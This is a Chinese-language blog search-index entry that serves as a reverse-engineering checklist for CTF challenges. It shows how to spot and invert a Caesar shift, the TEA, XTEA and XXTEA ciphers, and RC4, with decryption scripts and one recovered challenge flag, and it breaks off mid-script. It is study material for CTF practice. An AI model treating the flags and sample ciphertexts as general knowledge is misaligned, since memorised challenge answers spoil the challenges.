<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Reverse_CheckList</title>
      <link href="/2025/04/03/Reverse-CheckList/"/>
      <url>/2025/04/03/Reverse-CheckList/</url>
      
        <content type="html"><![CDATA[<h4 id="凯撒解密-IF-判断-ASCII，移位"><a href="#凯撒解密-IF-判断-ASCII，移位" class="headerlink" title="凯撒解密 (IF 判断 ASCII，移位)"></a>凯撒解密 (IF 判断 ASCII，移位)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encode_three</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">int</span> a2, <span class="type">char</span> *a3, <span class="type">int</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// [rsp+30h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  v8 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 || !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>i64;  <span class="comment">//不用管</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i ) </span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *v8;</span><br><span class="line">    <span class="comment">//可以先从最里面开始逆向，方便阅读</span></span><br><span class="line">    <span class="keyword">if</span> ( *v8 &lt;= <span class="number">64</span> || v5 &gt; <span class="number">90</span> )  <span class="comment">//大写字母  (大写字母不包括，所以else中才是大写字母移位的操作)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &lt;= <span class="number">96</span> || v5 &gt; <span class="number">122</span> ) <span class="comment">//小写字母</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 &lt;= <span class="number">47</span> || v5 &gt; <span class="number">57</span> ) <span class="comment">//如果是非0-9的字符</span></span><br><span class="line">          *a3 = v5; <span class="comment">//直接移位</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          *a3 = (v5 - <span class="number">48</span> + <span class="number">3</span>) % <span class="number">10</span> + <span class="number">48</span>; <span class="comment">//数字移位</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *a3 = (v5 - <span class="number">97</span> + <span class="number">3</span>) % <span class="number">26</span> + <span class="number">97</span>; <span class="comment">//小写字母移位</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *a3 = (v5 - <span class="number">65</span> + <span class="number">3</span>) % <span class="number">26</span> + <span class="number">65</span>; <span class="comment">//大写字母移位</span></span><br><span class="line">    &#125;</span><br><span class="line">    ++a3;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>移位操作，<code>+3</code> 移位需要都改成 <code>-3</code>, 反着来, 先进行 else , 解密脚本</p><ul><li><strong>伪代码没有&#x3D; ，不输出时可以尝试加上&#x3D;，一般要加&#x3D;</strong></li><li><strong>记得变符号</strong></li><li><strong>没有最后的else就不管他</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(i) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i) &lt;= <span class="number">57</span>:  <span class="comment"># 记得加等于, 即使伪代码没有写</span></span><br><span class="line">        data1 += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">48</span> - <span class="number">3</span> ) % <span class="number">10</span> + <span class="number">48</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(i) &gt;= <span class="number">97</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i) &lt;= <span class="number">122</span>:</span><br><span class="line">        data1 += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">97</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(i) &gt;= <span class="number">65</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i) &lt;= <span class="number">90</span>:</span><br><span class="line">        data1 += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">65</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 有些伪代码可能没有else： 那就不写else呗</span></span><br><span class="line">        data1 += i;</span><br></pre></td></tr></table></figure><h4 id="TEA-系列-DELTA，左移右移"><a href="#TEA-系列-DELTA，左移右移" class="headerlink" title="TEA 系列 (DELTA，左移右移)"></a>TEA 系列 (DELTA，左移右移)</h4><ul><li><strong>TEA &#x2F; XTEA</strong><br>特征：<br>0x9e3779b9 DELTA<br>左移4和右移5</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加密核心代码</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">    v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ∧ (v0 + sum) ∧ ((v0&gt;&gt;<span class="number">5</span>) + k3);  <span class="comment">// 右侧异或可以理解为是常数, v1 += const</span></span><br><span class="line">    v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ∧ (v1 + sum) ∧ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">    sum += delta;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 把 += 改为 -= 就是解密操作</span></span><br></pre></td></tr></table></figure><p><strong>[+]解密脚本</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>XXTEA</strong><br>特征：<br>右移5，左移2，右移3，左移4<br>有固定 DELTA 值: 0x9e3779b9<br><strong>[+]解密脚本</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4) ^ (sum ^ y) + (k[(p &amp; 3) ^ e] ^ z)</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">xxtea</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">int</span> n, <span class="type">unsigned</span> <span class="type">int</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> z = v[n - <span class="number">1</span>], y = v[<span class="number">0</span>], sum = <span class="number">0</span>, e, DELTA = <span class="number">0x9e3779b9</span>;  <span class="comment">//注意DELTA值！</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> p, q;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123; <span class="comment">/* Coding Part */</span></span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">                y = v[p + <span class="number">1</span>], z = v[p] += MX;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123; <span class="comment">/* Decoding Part */</span></span><br><span class="line">        n = -n;</span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = q * DELTA;</span><br><span class="line">        <span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">                z = v[p - <span class="number">1</span>], y = v[p] -= MX;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">35</span>] = &#123;</span><br><span class="line">        <span class="number">3880694563u</span>, <span class="number">3081185334u</span>, <span class="number">1506439138u</span>, <span class="number">2524759489u</span>,</span><br><span class="line">        <span class="number">3883935348u</span>, <span class="number">1026381030u</span>, <span class="number">2325545814u</span>, <span class="number">2581382044u</span>,</span><br><span class="line">        <span class="number">1881594093u</span>, <span class="number">1781792173u</span>, <span class="number">4103492874u</span>, <span class="number">1553756062u</span>,</span><br><span class="line">        <span class="number">468045900u</span>, <span class="number">1730391575u</span>, <span class="number">1383114178u</span>, <span class="number">2890011402u</span>,</span><br><span class="line">        <span class="number">2227070898u</span>, <span class="number">1885128569u</span>, <span class="number">1548828056u</span>, <span class="number">4214676013u</span>,</span><br><span class="line">        <span class="number">571971141u</span>, <span class="number">1558401693u</span>, <span class="number">3515474427u</span>, <span class="number">3898332297u</span>,</span><br><span class="line">        <span class="number">1942540575u</span>, <span class="number">1421197718u</span>, <span class="number">3061626000u</span>, <span class="number">555214026u</span>,</span><br><span class="line">        <span class="number">2648963476u</span>, <span class="number">794468778u</span>, <span class="number">2816999933u</span>, <span class="number">3272437419u</span>,   </span><br><span class="line">        <span class="number">464379036u</span>, <span class="number">877899850u</span>, <span class="number">2460223225u</span>      <span class="comment">//解密的数据</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> &#125;;    <span class="comment">//key值</span></span><br><span class="line">    xxtea(v, <span class="number">-35</span>, key);        <span class="comment">//-35： 35为35位(strlen)，负号为解密，不加则是加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v[i]);    <span class="comment">//依次打印</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可尝试此解密脚本 (大小端序？)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5) ^ (y <span class="string">&lt;&lt; 2)) + ((y &gt;</span>&gt; 3) ^ (z &lt;&lt; 4)) ^ (sum ^ y) + (k[(p &amp; 3) ^ e] ^ z))</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">btea</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *v, <span class="type">int</span> n, <span class="type">unsigned</span> <span class="type">int</span> *k)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> z = v[n - <span class="number">1</span>], y = v[<span class="number">0</span>], sum = <span class="number">0</span>, e, DELTA = <span class="number">0x61C88647</span>; <span class="comment">//May Change This</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> p, q;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)</span><br><span class="line">    &#123; <span class="comment">/* enCoding Part */</span></span><br><span class="line">        q = <span class="number">415</span> / n + <span class="number">114</span>;  <span class="comment">//May Chnage This</span></span><br><span class="line">        <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; (n - <span class="number">1</span>); p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)</span><br><span class="line">    &#123; <span class="comment">/* Decoding Part */</span></span><br><span class="line">        n = -n;</span><br><span class="line">        q = <span class="number">415</span> / n + <span class="number">114</span>;  <span class="comment">//May Change This</span></span><br><span class="line">        sum = -q * DELTA;  <span class="comment">//different</span></span><br><span class="line">        <span class="keyword">while</span> (sum != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum += DELTA;   <span class="comment">//different</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">11</span>] = &#123;<span class="number">0x480AC20C</span>, <span class="number">0xCE9037F2</span>, <span class="number">0x8C212018</span>, <span class="number">0xE92A18D</span>, <span class="number">0xA4035274</span>, <span class="number">0x2473AAB1</span>, <span class="number">0xA9EFDB58</span>, <span class="number">0xA52CC5C8</span>, <span class="number">0xE432CB51</span>, <span class="number">0xD04E9223</span>, <span class="number">0x6FD07093</span>&#125;, key[<span class="number">4</span>] = &#123;<span class="number">0x79696755</span>, <span class="number">0x67346F6C</span>, <span class="number">0x69231231</span>, <span class="number">0x5F674231</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">11</span>;       <span class="comment">// n为要加密的数据个数</span></span><br><span class="line">    btea(v, -n, key); <span class="comment">// 取正为加密，取负为解密</span></span><br><span class="line">    <span class="type">char</span> *p = (<span class="type">char</span> *)v; </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">44</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, *p);</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;efccf8f0-0c97-12ec-82e0-0c9d9242e335&#125;</span></span><br></pre></td></tr></table></figure><h4 id="RC4-多次256循环以及模256"><a href="#RC4-多次256循环以及模256" class="headerlink" title="RC4 (多次256循环以及模256)"></a>RC4 (多次256循环以及模256)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4解密主函数调用成功&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原来的 s 盒：%s&quot;</span> % s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;混乱后的 s 盒：%s&quot;</span>% s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;调用解密程序成功。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;res用于解密字符串，解密后是：%res&quot;</span> %res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的字符串是：%s&quot;</span> %cipher)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的输出(没经过任何编码):&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0xc6</span>,<span class="number">0x21</span>,<span class="number">0xca</span>,<span class="number">0xbf</span>,<span class="number">0x51</span>,<span class="number">0x43</span>,<span class="number">0x37</span>,<span class="number">0x31</span>,<span class="number">0x75</span>,<span class="number">0xe4</span>,<span class="number">0x8e</span>,<span class="number">0xc0</span>,<span class="number">0x54</span>,<span class="number">0x6f</span>,<span class="number">0x8f</span>,<span class="number">0xee</span>,<span class="number">0xf8</span>,<span class="number">0x5a</span>,<span class="number">0xa2</span>,<span class="number">0xc1</span>,<span class="number">0xeb</span>,<span class="number">0xa5</span>,<span class="number">0x34</span>,<span class="number">0x6d</span>,<span class="number">0x71</span>,<span class="number">0x55</span>,<span class="number">0x8</span>,<span class="number">0x7</span>,<span class="number">0xb2</span>,<span class="number">0xa8</span>,<span class="number">0x2f</span>,<span class="number">0xf4</span>,<span class="number">0x51</span>,<span class="number">0x8e</span>,<span class="number">0xc</span>,<span class="number">0xcc</span>,<span 